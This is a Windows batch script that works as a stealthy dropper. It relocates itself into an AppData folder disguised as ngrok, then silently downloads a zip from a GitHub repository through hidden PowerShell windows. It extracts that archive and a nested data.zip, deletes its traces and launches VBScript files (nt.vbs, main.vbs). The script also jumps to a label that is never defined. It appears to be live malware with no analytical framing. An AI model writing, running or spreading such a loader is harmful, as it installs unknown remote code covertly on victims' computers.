@echo off
setlocal

set "USER=%USERNAME%"
set "NGROK_DIR=C:\Users\%USER%\AppData\Local\ngrok"
set "REPO_URL=https://github.com/ofutpemata22/mamf/archive/refs/heads/main.zip"
set "ZIP_PATH=%NGROK_DIR%\mamf.zip"
set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"

if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"

move "%~f0" "%NGROK_DIR%\"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%ZIP_PATH%')"
powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%NGROK_DIR%\__repo__'"
xcopy "%NGROK_DIR%\__repo__\mamf-main\*" "%NGROK_DIR%\" /s /e /h /y
del "%ZIP_PATH%"
rmdir /S /Q "%NGROK_DIR%\__repo__"
powershell -WindowStyle Hidden -Command "Expand-Archive -Path '%NGROK_DIR%\data.zip' -DestinationPath '%NGROK_DIR%\__extracted__'"
xcopy "%NGROK_DIR%\__extracted__\*" "%NGROK_DIR%\" /s /e /h /y
rmdir /S /Q "%NGROK_DIR%\__extracted__"

start "" "%NGROK_DIR%\nt.vbs"

timeout /t 2 >nul
if exist "%TEMP_FILE%" (
    start "" "%NGROK_DIR%\main.vbs"
    exit /b
)
goto WAIT_FILE

endlocal
